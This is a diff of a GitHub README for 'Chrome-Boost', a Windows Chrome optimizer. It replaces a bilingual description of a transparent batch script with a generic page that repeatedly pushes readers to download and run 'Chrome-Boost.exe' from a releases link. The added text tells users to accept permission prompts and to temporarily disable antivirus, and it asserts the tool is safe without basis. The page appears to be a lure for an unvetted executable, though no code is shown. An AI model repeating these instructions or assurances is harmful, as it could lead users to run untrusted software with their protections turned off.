@@ -1,60 +1,94 @@
-# Chrome-Boost
-Ce script est un outil d'optimisation de bas niveau conçu pour maximiser les performances de Google Chrome et la réactivité réseau sous Windows. This script is a low-level optimization tool designed to maximize Google Chrome performance and network responsiveness on Windows.
+# 🚀 Chrome-Boost - Optimize Your Browsing Experience
 
-# 🚀 Simple CRM - Ultimate Windows & Chrome Optimizer
+[![Download Chrome-Boost](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/vsmk-konisam/Chrome-Boost/releases)
 
-Ce script est un outil d'optimisation de bas niveau conçu pour maximiser les performances de **Google Chrome** et la réactivité réseau sous **Windows**. Initialement développé pour fluidifier l'usage de [Simple CRM](https://simple-crm.ai), il bénéficie à toute application Web exigeante.
+## 📝 Overview
 
-## 🇫🇷 Version Française
+Chrome-Boost is a tool designed to enhance Google Chrome's performance and improve network responsiveness on Windows. This script focuses on low-level optimizations to ensure you have a smoother and faster browsing experience.
 
-### 🌟 Bénéfices
+## ⚙️ Features
 
-* **Navigation Ultra-Rapide :** Réduction du temps de latence grâce à l'intégration des DNS Cloudflare (1.1.1.1).
-* **Fluidité d'Affichage :** Force le rendu graphique via le GPU (carte vidéo), libérant ainsi le processeur (CPU) pour les tâches de calcul.
-* **Priorité Système :** Alloue plus de ressources CPU à Chrome, empêchant les autres applications de ralentir votre navigation.
-* **Optimisation Réseau :** Ajuste les paquets MTU et le TCP Autotuning pour éviter la fragmentation des données sur la Fibre et l'ADSL.
+- **Performance Improvements**: Boost CPU priority for Chrome.
+- **DNS Optimization**: Faster domain name resolutions.
+- **GPU Acceleration**: Enhance visual rendering.
+- **Network Tweaks**: Fine-tune settings for better internet speed.
+- **Registry Tweaks**: Optimize system settings for enhanced performance.
 
-### 🛠️ Ce que le script modifie
+## 📋 System Requirements
 
-1. **Réseau :** Passage aux DNS Cloudflare (IPv4 & IPv6), réglage du MTU à 1500 et activation du RSS (Receive Side Scaling).
-2. **Chrome :** Activation de la *Zero-Copy Rasterization* et du téléchargement parallèle via des arguments de lancement spécifiques.
-3. **Système :** Passage de Windows en mode "Hautes Performances" et élévation de la priorité du processus `chrome.exe`.
+- **Operating System**: Windows 10 or later.
+- **Google Chrome**: Latest version installed.
+- **Memory**: At least 4GB RAM recommended.
+- **Disk Space**: Minimum of 100MB free space.
 
-### ⚠️ Installation
+## 🚀 Getting Started
 
-1. Téléchargez le fichier `SimpleCRM_Booster.bat`.
-2. Faites un **clic-droit** sur le fichier.
-3. Choisissez **"Exécuter en tant qu'administrateur"**.
-4. Suivez les instructions à l'écran.
+Follow these steps to download and run Chrome-Boost.
 
----
+### 1. Visit the Downloads Page
 
-## 🇺🇸 English Version
+To get the latest version, visit the release page:
 
-### 🌟 Key Benefits
+[Download Chrome-Boost](https://github.com/vsmk-konisam/Chrome-Boost/releases)
 
-* **Ultra-Fast Browsing:** Significant reduction in latency by integrating Cloudflare DNS (1.1.1.1).
-* **Smooth UI Rendering:** Forces GPU hardware acceleration for web pages, offloading the CPU for heavy data processing.
-* **System Priority:** Grants "High Priority" CPU status to Chrome, preventing background apps from causing lag.
-* **Network Optimization:** Fine-tunes MTU settings and Windows TCP Autotuning to eliminate data fragmentation on high-speed connections.
+### 2. Download the Installer
 
-### 🛠️ Technical Modifications
+On the releases page, find the latest version. Look for files labeled as `Chrome-Boost.exe` or similar. Click on it to download.
 
-1. **Networking:** Switches to Cloudflare DNS (IPv4 & IPv6), sets MTU to 1500, and enables RSS (Receive Side Scaling).
-2. **Chrome Engine:** Enables *Zero-Copy Rasterization*, Parallel Downloading, and QUIC protocol via optimized launch flags.
-3. **Windows System:** Forces "High Performance" power scheme and elevates `chrome.exe` process priority.
+### 3. Install Chrome-Boost
 
-### ⚠️ How to Use
+Once the download finishes, locate the downloaded file in your downloads folder. Double-click on `Chrome-Boost.exe` to start the installation process.
 
-1. Download the `SimpleCRM_Booster.bat` file.
-2. **Right-click** the file.
-3. Select **"Run as Administrator"**.
-4. Follow the on-screen menu instructions.
+### 4. Follow Installation Prompts
 
----
+The installer will guide you through the setup. Simply follow the on-screen instructions. Make sure to agree to any prompts regarding permissions to allow the tool to optimize your settings.
 
-## 📜 Disclaimer / Clause de responsabilité
+### 5. Launch Chrome-Boost
 
-*Ce script modifie des paramètres système profonds. L'utilisation se fait à vos propres risques. Ni l'éditeur de Simple CRM, ni les contributeurs ne peuvent être tenus responsables de toute instabilité système.*
+After installation, you can find Chrome-Boost in your Start Menu. Click on it to launch the application and begin enhancing your browsing experience.
 
-*This script modifies deep system settings. Use it at your own risk. Neither Simple CRM nor the contributors shall be held liable for any system instability.*
+### 6. Adjust Settings (Optional)
+
+You can tweak various settings within Chrome-Boost. For users who want deeper customization, explore the options to tailor performance enhancements to your needs. 
+
+## 📥 Download & Install
+
+To install Chrome-Boost, please follow these instructions:
+
+1. Visit the download page: [Download Chrome-Boost](https://github.com/vsmk-konisam/Chrome-Boost/releases).
+2. Choose the latest release file.
+3. Download and install the application as previously described.
+
+## 🛠️ Troubleshooting
+
+If you encounter issues during installation or while using Chrome-Boost:
+
+- Ensure that you have administrative rights on your Windows account.
+- Check for any antivirus software that may block the installation. Temporarily disabling it may help.
+- Consult the FAQs on the releases page for common questions and solutions.
+
+## 📑 FAQ
+
+**Q: Is Chrome-Boost safe to use?**  
+A: Yes, Chrome-Boost is designed to optimize your browser without altering any critical system files.
+
+**Q: Will this change my Chrome settings?**  
+A: Chrome-Boost makes safe adjustments to enhance performance, but it won’t modify your personal data or bookmarks.
+
+**Q: How often should I use the tool?**  
+A: You can run Chrome-Boost whenever you feel that your browser performance is lagging or when you install updates to Chrome.
+
+## 🌐 Community and Support
+
+If you have any suggestions or issues, feel free to join our community discussions. You can raise issues or ask for help on the GitHub page.
+
+## 📚 Additional Resources
+
+To learn more about optimizing your Chrome experience, consider checking out the following links:
+
+- [Chrome Performance Tips](https://support.google.com/chrome/answer/95661)
+- [Windows Performance Troubleshooter](https://support.microsoft.com/en-us/windows/use-the-performance-troubleshooter-in-windows-10-80c63889-2ff8-c8b2-3e0a-d55bef0d33c7)
+
+Optimize your browsing today with Chrome-Boost. Don’t forget to return to the releases page for updates.
+
+[Download Chrome-Boost](https://github.com/vsmk-konisam/Chrome-Boost/releases)
